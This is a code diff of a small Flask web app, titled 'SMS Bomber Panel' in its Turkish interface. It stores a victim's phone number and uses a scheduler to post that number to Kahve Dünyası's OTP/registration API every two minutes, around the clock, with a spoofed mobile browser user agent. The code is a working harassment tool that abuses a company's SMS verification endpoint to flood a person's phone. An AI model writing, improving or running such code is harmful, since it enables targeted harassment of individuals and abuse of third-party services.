@@ -1,12 +1,12 @@
-import os
+from flask import Flask, render_template_string, request, redirect, url_for
+from flask_apscheduler import APScheduler
 import requests
 import time
-from flask import Flask, render_template_string, request
-from flask_apscheduler import APScheduler
+import os
 
 app = Flask(__name__)
 
-# --- APSCHEDULER AYARI ---
+# Zamanlayıcı Ayarları
 class Config:
     SCHEDULER_API_ENABLED = True
 
@@ -15,81 +15,86 @@ scheduler = APScheduler()
 scheduler.init_app(app)
 scheduler.start()
 
-# Değişkenleri hafızada tutuyoruz (Uygulama restart yiyene kadar kalır)
-sys_data = {
-    "target": "",
-    "is_active": False,
-    "logs": []
-}
+# Global Değişkenler (Numara ve Kayıtlar)
+target_phone = ""
+logs = []
 
-def write_log(message):
-    now = time.strftime('%H:%M:%S')
-    full_msg = f"[{now}] {message}"
-    sys_data["logs"].append(full_msg)
-    if len(sys_data["logs"]) > 12: sys_data["logs"].pop(0)
-    # RENDER PANELE ANINDA DÖKMEK İÇİN:
-    print(f">>> {full_msg}", flush=True)
-
-# 2 DAKİKADA BİR ÇALIŞACAK GÖREV
-@scheduler.task('interval', id='do_job', minutes=2)
-def auto_worker():
-    if not sys_data["is_active"] or not sys_data["target"]:
+def send_kahve_dunyasi_otp():
+    global target_phone, logs
+    if not target_phone:
         return
 
-    url = "https://api.kahvedunyasi.com/v1/login/otp"
-    payload = {"mobile_number": sys_data["target"], "channel": "sms"}
-    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (iPhone; CPU OS 17_0 like Mac OS X)"}
+    url = "https://www.kahvedunyasi.com/api/v1/auth/register-otp"
+    payload = {"mobile_number": target_phone, "country_code": "90"}
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
+    }
 
     try:
-        r = requests.post(url, json=payload, headers=headers, timeout=10)
-        status = "BAŞARILI (200)" if r.status_code == 200 else f"HATA ({r.status_code})"
-        write_log(f"{sys_data['target']} -> {status}")
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        if response.status_code in [200, 201]:
+            status = "Başarılı ✅"
+        else:
+            status = f"Hata ❌ ({response.status_code})"
+        logs.append(f"[{time.strftime('%H:%M:%S')}] {status}")
     except:
-        write_log("BAĞLANTI KESİLDİ")
+        logs.append(f"[{time.strftime('%H:%M:%S')}] Bağlantı Hatası ⚠️")
 
-@app.route('/')
-def ui():
-    # Sade ve Karanlık Tasarım
+    # Son 15 kaydı tut
+    if len(logs) > 15: logs.pop(0)
+
+# 2 DAKİKADA BİR GÖNDERİM AYARI (minutes=2)
+scheduler.add_job(id='sms_job', func=send_kahve_dunyasi_otp, trigger='interval', minutes=2)
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    global target_phone, logs
+    if request.method == 'POST':
+        new_phone = request.form.get('phone', '').strip()
+        if new_phone:
+            target_phone = new_phone
+            logs.append(f"[{time.strftime('%H:%M:%S')}] Hedef güncellendi: {target_phone}")
+        return redirect(url_for('index'))
+
     html = """
     <!DOCTYPE html>
     <html lang="tr">
     <head>
-        <meta charset="UTF-8"><title>SMS Panel</title>
+        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>SMS Bomber Panel</title>
         <style>
-            body { background: #0a0a0a; color: #eee; font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
-            .box { background: #1a1a1a; padding: 25px; border-radius: 12px; width: 320px; border: 1px solid #333; text-align: center; }
-            input { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #444; color: #0f0; border-radius: 5px; box-sizing: border-box; }
-            button { width: 48%; padding: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
-            .start { background: #28a745; color: #fff; }
-            .stop { background: #dc3545; color: #fff; }
-            .logs { background: #000; color: #0f0; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 11px; height: 160px; overflow-y: auto; margin-top: 15px; text-align: left; }
+            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; margin: 0; }
+            .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 360px; text-align: center; }
+            h2 { color: #1a73e8; margin-bottom: 20px; }
+            input[type="text"] { width: 100%; padding: 12px; margin-bottom: 15px; border: 2px solid #eee; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; transition: 0.3s; }
+            input[type="text"]:focus { border-color: #1a73e8; }
+            button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
+            button:hover { background: #1557b0; transform: translateY(-2px); }
+            .log-box { text-align: left; background: #1c1c1c; color: #00ff00; padding: 15px; border-radius: 8px; font-family: 'Courier New', Courier, monospace; font-size: 13px; height: 180px; overflow-y: auto; margin-top: 20px; box-shadow: inset 0 0 10px #000; }
+            .status-bar { margin-bottom: 15px; padding: 10px; border-radius: 6px; background: #e8f0fe; color: #1967d2; font-size: 14px; font-weight: bold; }
         </style>
-        <script>setTimeout(() => location.reload(), 15000);</script>
+        <script>setTimeout(() => { if (!document.querySelector('input:focus')) location.reload(); }, 20000);</script>
     </head>
     <body>
-        <div class="box">
-            <h3>SMS MOTORU v4</h3>
-            <p style="color: {{ 'lime' if data.is_active else 'red' }}">Sistem: {{ 'ÇALIŞIYOR' if data.is_active else 'DURDU' }}</p>
-            <form action="/set" method="post">
-                <input type="text" name="num" placeholder="5XXXXXXXXX" value="{{ data.target }}">
-                <button name="op" value="on" class="start">BAŞLAT</button>
-                <button name="op" value="off" class="stop">DURDUR</button>
-            </form>
-            <div class="logs">
-                {% for l in logs %}> {{ l }}<br>{% endfor %}
+        <div class="card">
+            <h2>SMS Motoru</h2>
+            <div class="status-bar">
+                {% if phone %} ● Sistem Aktif: {{ phone }} {% else %} ○ Numara Bekleniyor... {% endif %}
             </div>
+            <form method="POST">
+                <input type="text" name="phone" placeholder="Örn: 5051234567" value="{{ phone }}">
+                <button type="submit">Numarayı Kaydet & Başlat</button>
+            </form>
+            <div class="log-box">
+                {% for log in logs %}<div style="margin-bottom:5px;">> {{ log }}</div>{% endfor %}
+            </div>
+            <p style="font-size:11px; color:#777; margin-top:15px;">Aralık: 2 Dakika | 24 Saat Kesintisiz</p>
         </div>
     </body>
     </html>
     """
-    return render_template_string(html, data=sys_data, logs=reversed(sys_data["logs"]))
-
-@app.route('/set', methods=['POST'])
-def set_data():
-    sys_data["target"] = request.form.get('num', '')
-    sys_data["is_active"] = (request.form.get('op') == 'on')
-    write_log(f"Sistem Güncellendi. Hedef: {sys_data['target']}")
-    return jsonify({"ok": True}), 302, {'Location': '/'}
+    return render_template_string(html, phone=target_phone, logs=reversed(logs))
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
